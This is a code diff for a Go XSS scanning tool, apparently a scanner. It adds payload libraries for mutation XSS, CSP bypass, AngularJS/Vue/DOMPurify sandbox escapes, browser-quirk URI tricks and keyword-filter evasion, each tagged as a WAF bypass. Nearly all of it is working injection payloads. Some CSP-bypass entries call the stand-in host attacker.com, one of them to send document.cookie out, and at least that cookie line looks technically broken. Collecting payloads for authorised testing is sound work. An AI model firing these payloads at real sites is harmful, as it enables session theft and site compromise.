@@ -82,6 +82,11 @@ func GetAllPayloads() []Payload {
 	all = append(all, cssPayloads...)
 	all = append(all, templatePayloads...)
 	all = append(all, polyglotPayloads...)
+	all = append(all, mxssPayloads...)
+	all = append(all, cspBypassPayloads...)
+	all = append(all, sandboxEscapePayloads...)
+	all = append(all, browserBypassPayloads...)
+	all = append(all, bashFunctionConstructorPayloads...)
 	return all
 }
 
@@ -326,4 +331,98 @@ var polyglotPayloads = []Payload{
 		Polyglot:    true,
 		WAFBypass:   true,
 	},
+}
+
+// --- HackTricks / PayloadAllTheThings WAF/CSP/mXSS knowledge expansion ---
+
+// mxssPayloads exploit DOM mutation: a sanitiser passes the input,
+// then the browser's HTML parser "fixes" or normalises the markup
+// during innerHTML assignment in a way that resurrects the payload.
+// Most are HackTricks-documented variants discovered by Mario Heiderich.
+var mxssPayloads = []Payload{
+	{Value: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", Context: HTMLContext, Type: TypeStored, Description: "mXSS — noscript title escape (sanitizer round-trip)", WAFBypass: true},
+	{Value: "<svg></p><style><a id=\"</style><img src=x onerror=alert(1)>\">", Context: HTMLContext, Type: TypeStored, Description: "mXSS — svg→p flow + style id quote", WAFBypass: true},
+	{Value: "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><a title=\"</textarea><img src=x onerror=alert(1)>\">", Context: HTMLContext, Type: TypeStored, Description: "mXSS — MathML foreign-content escape", WAFBypass: true},
+	{Value: "<a href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)\">go</a>", Context: HTMLContext, Type: TypeReflected, Description: "mXSS — entity-encoded javascript URI", WAFBypass: true},
+	{Value: "<noembed><img title=\"</noembed><img src=x onerror=alert(1)>\">", Context: HTMLContext, Type: TypeStored, Description: "mXSS — noembed title escape", WAFBypass: true},
+	{Value: "<style><img src=x onerror=alert(1)></style>", Context: HTMLContext, Type: TypeStored, Description: "mXSS — innerHTML parses style content as raw text", WAFBypass: true},
+	{Value: "<svg><style>@import url('javascript:alert(1)');</style>", Context: HTMLContext, Type: TypeReflected, Description: "mXSS — svg foreign-content style @import", WAFBypass: true},
+	{Value: "<svg xmlns=\"http://www.w3.org/2000/svg\"><a xlink:href=javascript:alert(1)><text x=20 y=20>click</text></a></svg>", Context: HTMLContext, Type: TypeReflected, Description: "SVG xlink:href javascript URI", WAFBypass: true},
+}
+
+// cspBypassPayloads chain XSS through Content-Security-Policy weak
+// configurations. Each targets a specific common misconfiguration
+// (default-src 'self' with a JSONP endpoint, 'unsafe-inline',
+// hashed-source omission, base-uri missing, etc.). Patterns are
+// hostnames the attacker controls plus gadget endpoints widely known
+// from PortSwigger CSP-bypass research.
+var cspBypassPayloads = []Payload{
+	{Value: "<script src='https://www.google.com/complete/search?client=chrome&jsonp=alert(1)'></script>", Context: HTMLContext, Type: TypeReflected, Description: "CSP bypass — Google JSONP gadget (default-src includes google.com)", WAFBypass: true},
+	{Value: "<script src='https://www.googletagmanager.com/gtm.js?id=alert(1)'></script>", Context: HTMLContext, Type: TypeReflected, Description: "CSP bypass — googletagmanager (allowlisted by analytics-using apps)", WAFBypass: true},
+	{Value: "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.9/angular.min.js'></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>", Context: HTMLContext, Type: TypeReflected, Description: "CSP bypass — AngularJS gadget via cdnjs (allowlisted CDN)", WAFBypass: true},
+	{Value: "<base href=//attacker.com/>", Context: HTMLContext, Type: TypeReflected, Description: "CSP bypass — <base> hijack (missing base-uri directive)", WAFBypass: true},
+	{Value: "<script nonce='REUSE_NONCE'>alert(1)</script>", Context: HTMLContext, Type: TypeReflected, Description: "CSP bypass — replay leaked nonce (server reuses across responses)", WAFBypass: true},
+	{Value: "<object data=//attacker.com/csp-bypass.html>", Context: HTMLContext, Type: TypeReflected, Description: "CSP bypass — object-src loophole (object-src defaults to default-src; missing object-src 'none' lets attacker iframe-equivalent)", WAFBypass: true},
+	{Value: "<iframe src=data:text/html,<script>alert(parent.document.cookie)</script>></iframe>", Context: HTMLContext, Type: TypeReflected, Description: "CSP bypass — data: in iframe when frame-src omits data:", WAFBypass: true},
+	{Value: "<link rel=preload as=script href='https://attacker.com/x.js?'+document.cookie>", Context: HTMLContext, Type: TypeReflected, Description: "CSP bypass — preload for exfiltration when connect-src is restricted but preload allowed", WAFBypass: true},
+}
+
+// sandboxEscapePayloads break out of JS sandboxes (Angular expression
+// sandbox in <1.6, Vue.js v-html escapes, etc.). Each one was
+// published as a confirmed sandbox escape against a specific version
+// or framework — collected from HackTricks and PortSwigger.
+var sandboxEscapePayloads = []Payload{
+	{Value: "{{constructor.constructor('alert(1)')()}}", Context: TemplateContext, Type: TypeReflected, Description: "Angular sandbox escape — constructor.constructor (post-1.6 in non-CSP mode)", WAFBypass: true},
+	{Value: "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}", Context: TemplateContext, Type: TypeReflected, Description: "AngularJS 1.6 sandbox escape (string prototype hijack)", WAFBypass: true},
+	{Value: "{{constructor.constructor('alert(1)')()}}<!--prevent vue-compile-->", Context: TemplateContext, Type: TypeReflected, Description: "Vue.js v-html sandbox escape (Vue 2 dev mode)", WAFBypass: true},
+	{Value: "<x v-html='\"<img src=x onerror=alert(1)>\"'></x>", Context: HTMLContext, Type: TypeReflected, Description: "Vue v-html direct injection", WAFBypass: true},
+	{Value: "<svg><script>123<a>alert(1)</a></script>", Context: HTMLContext, Type: TypeReflected, Description: "SVG inline script — DOMPurify <2.0.17 round-trip bypass", WAFBypass: true},
+}
+
+// browserBypassPayloads exploit specific browser quirks: Safari URL
+// parser, Firefox srcdoc decoding, Chrome XSS-auditor era tricks
+// repurposed for filter bypass, etc.
+var browserBypassPayloads = []Payload{
+	{Value: "<a href=\"javas\\tcript:alert(1)\">click</a>", Context: HTMLContext, Type: TypeReflected, Description: "Whitespace in javascript: URI (Safari)", WAFBypass: true},
+	{Value: "<a href=\"javascript&colon;alert(1)\">click</a>", Context: HTMLContext, Type: TypeReflected, Description: "Named-entity colon in href", WAFBypass: true},
+	{Value: "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>", Context: HTMLContext, Type: TypeReflected, Description: "srcdoc entity-decoded then parsed", WAFBypass: true},
+	{Value: "<iframe srcdoc='&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'></iframe>", Context: HTMLContext, Type: TypeReflected, Description: "srcdoc double-encoded", WAFBypass: true},
+	{Value: "<a href=\"\\x09javascript:alert(1)\">click</a>", Context: HTMLContext, Type: TypeReflected, Description: "Tab-prefixed javascript URI", WAFBypass: true},
+	{Value: "<a href=\" javascript:alert(1)\">click</a>", Context: HTMLContext, Type: TypeReflected, Description: "Leading space in href URI", WAFBypass: true},
+	{Value: "<form id=test><input name=attributes value=test></form><svg><animate xlink:href=#test attributeName=href values=javascript:alert(1) /><a><text x=20 y=20>click</text></a></svg>", Context: HTMLContext, Type: TypeReflected, Description: "SVG animate attributeName href hijack", WAFBypass: true},
+}
+
+// bashFunctionConstructorPayloads use modern JS Function/Generator
+// idioms to call eval without literal "eval" or "alert" strings —
+// useful when a WAF blacklists both keywords.
+var bashFunctionConstructorPayloads = []Payload{
+	{Value: "<img src=x onerror=top['al'+'ert'](1)>", Context: HTMLContext, Type: TypeReflected, Description: "String concat to dodge keyword filter", WAFBypass: true},
+	{Value: "<img src=x onerror=top[/al/.source+/ert/.source](1)>", Context: HTMLContext, Type: TypeReflected, Description: "Regex source concat for alert", WAFBypass: true},
+	{Value: "<img src=x onerror=(()=>{return this})()['ale'+'rt'](1)>", Context: HTMLContext, Type: TypeReflected, Description: "Arrow this-recovery + concat", WAFBypass: true},
+	{Value: "<img src=x onerror=Function`ale\\u0072t\\`1\\``>", Context: HTMLContext, Type: TypeReflected, Description: "Function constructor + tagged template", WAFBypass: true},
+	{Value: "<img src=x onerror=import('data:text/javascript,alert(1)')>", Context: HTMLContext, Type: TypeReflected, Description: "Dynamic import data: URI", WAFBypass: true},
+	{Value: "<a href=javascript:alert(1)>x</a><a onmouseover=alert(1)>click</a>", Context: HTMLContext, Type: TypeReflected, Description: "Multi-vector single payload"},
+}
+
+// GetMXSSPayloads returns mutation-XSS payloads.
+func GetMXSSPayloads() []Payload {
+	return mxssPayloads
+}
+
+// GetCSPBypassPayloads returns CSP-bypass payloads keyed on common
+// allowlisted CDN gadgets, base-uri omission, and nonce reuse.
+func GetCSPBypassPayloads() []Payload {
+	return cspBypassPayloads
+}
+
+// GetSandboxEscapePayloads returns framework sandbox-escape payloads
+// (AngularJS, Vue, DOMPurify version-specific).
+func GetSandboxEscapePayloads() []Payload {
+	return sandboxEscapePayloads
+}
+
+// GetBrowserBypassPayloads returns browser-quirk-based bypasses
+// (URL parser, srcdoc decoding, attribute normalisation).
+func GetBrowserBypassPayloads() []Payload {
+	return browserBypassPayloads
 }
